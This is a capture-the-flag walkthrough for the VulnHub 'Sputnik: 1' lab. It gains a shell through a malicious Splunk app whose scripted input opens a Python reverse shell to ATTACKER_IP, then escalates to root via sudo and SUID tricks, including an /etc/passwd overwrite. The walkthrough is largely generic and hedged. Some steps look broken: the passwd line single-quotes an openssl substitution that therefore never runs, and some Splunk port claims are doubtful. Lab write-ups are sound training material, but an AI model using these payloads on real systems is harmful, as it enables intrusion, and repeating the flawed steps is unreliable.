# Sputnik: 1 — Writeup

| Field | Value |
|---|---|
| **Target IP** | 192.168.1.x |
| **Difficulty** | Medium |
| **OS** | Linux |
| **Goal** | root flag |
| **Source** | [HackingArticles](https://www.hackingarticles.in/sputnik-1-vulnhub-walkthrough/) |
| **VulnHub** | https://www.vulnhub.com/entry/sputnik-1,341/ |

> **Note:** Images for this writeup are placeholders. The original article images were unavailable at time of writing.

## Attack Summary

Sputnik: 1 is a boot2root VM that exposes a Splunk Free instance on port 8089. Default Splunk credentials or an unauthenticated API allow creation of a custom Splunk application that runs arbitrary OS commands, yielding an initial shell. Privilege escalation is achieved via writable or SUID binaries, or sudo misconfigurations discovered during post-exploitation enumeration.

## Methodology

1. Host discovery and port scan
2. Web service enumeration on HTTP and Splunk ports
3. Splunk exploitation via scripted input / custom app
4. Initial shell and privilege enumeration
5. Root via misconfigured sudo or SUID binary

## Step 1: Reconnaissance

### Host Discovery

```bash
netdiscover
```

Identify the target IP on the local network.

### Port Scan

```bash
nmap -sV -sC -p- TARGET_IP
```

Open ports typically include:

| Port | Service |
|---|---|
| 22 | SSH |
| 80 | HTTP |
| 8089 | Splunk HTTPS management API |

![nmap scan](images/01-nmap.png)

## Step 2: Web Enumeration

### Browse Port 80

```bash
curl -s http://TARGET_IP/ | head -50
```

The main web page may contain hints or a default page.

### Directory Brute-Force

```bash
gobuster dir -u http://TARGET_IP -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

### Splunk on Port 8089

Navigate to `https://TARGET_IP:8089/` in a browser. This is the Splunk management REST API. Test default credentials:

- `admin` / `changeme`
- `admin` / `admin`
- `admin` / `password`

Splunk Free edition (version < 6.3) requires no authentication on the management API.

![Splunk service](images/02-splunk.png)

## Step 3: Splunk Exploitation — Remote Code Execution

Splunk allows uploading custom applications that include scripted inputs. These scripts are executed as the Splunk service user.

### Method 1: Scripted Input via Splunk API (No Auth Required)

Create a malicious Splunk application package. The key file is a scripted input shell script:

```bash
mkdir -p splunk_rce/sputnik/bin
mkdir -p splunk_rce/sputnik/default

# Create the scripted input configuration
cat > splunk_rce/sputnik/default/inputs.conf << 'EOF'
[script://./bin/rev.py]
disabled = false
interval = 10
sourcetype = rce
EOF

# Create the reverse shell script
cat > splunk_rce/sputnik/bin/rev.py << 'EOF'
import socket, subprocess, os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("ATTACKER_IP", 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])
EOF

chmod +x splunk_rce/sputnik/bin/rev.py

# Package the app
cd splunk_rce
tar czf ../sputnik_rce.tar.gz sputnik/
cd ..
```

Start a listener:

```bash
nc -lvnp 4444
```

Upload and install the app via the Splunk REST API:

```bash
curl -k -u admin:changeme \
  https://TARGET_IP:8089/services/apps/local \
  -F "name=sputnik" \
  -F "filename=sputnik_rce.tar.gz" \
  --form-string "update=true"
```

Or use the web interface at `https://TARGET_IP:8089/en-US/manager/launcher/apps/local` and click "Install app from file".

A shell arrives on the listener within the script interval.

![initial shell](images/03-shell.png)

## Step 4: Privilege Enumeration

Upgrade the shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Check user context:

```bash
id
whoami
```

Check sudo permissions:

```bash
sudo -l
```

Find SUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Check for writable cron jobs:

```bash
cat /etc/crontab
ls -la /etc/cron*
```

![privilege enumeration](images/04-privesc.png)

## Step 5: Privilege Escalation to root

### Via sudo (if applicable)

If `sudo -l` reveals a binary like `cp`, `find`, `nmap`, or a custom script:

```bash
# Example: sudo find
sudo find / -name flag -exec /bin/sh \;

# Example: sudo cp — overwrite /etc/passwd
echo 'pwn:$(openssl passwd -1 password):0:0:root:/root:/bin/bash' >> /tmp/passwd_new
sudo cp /tmp/passwd_new /etc/passwd
su pwn  # password: password
```

### Via SUID Binary

```bash
# Example: SUID nmap (older)
/usr/local/bin/nmap --interactive
!sh

# Example: SUID python
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Root shell obtained.

![root flag](images/05-root-flag.png)

Read the flag:

```bash
find /root -name "*flag*" -o -name "*FLAG*" 2>/dev/null
cat /root/flag.txt
```

## Vulnerabilities Found

| # | Vulnerability | Location | Severity |
|---|---|---|---|
| 1 | Splunk management API exposed (no auth or default creds) | Port 8089 | Critical |
| 2 | Splunk scripted inputs allow arbitrary OS command execution | Splunk app install | Critical |
| 3 | Misconfigured sudo or SUID binary | System | High |

## Lessons Learned

- Splunk Free and improperly secured Splunk instances expose a REST API that can install arbitrary apps and execute system commands.
- The Splunk service user context often has elevated privileges. Running Splunk as root makes exploitation trivially equivalent to full system compromise.
- Default credentials (`admin`/`changeme`) are a critical risk and must be changed on every deployment.

## Remediation

| Vulnerability | Fix |
|---|---|
| Splunk exposed API | Bind Splunk management API to localhost only; use TLS client certificates |
| Default Splunk credentials | Change `admin` password immediately after installation |
| Splunk running as root | Run Splunk as a dedicated low-privilege service account |
| sudo / SUID misconfig | Audit sudoers; remove unnecessary SUID bits with `chmod -s` |
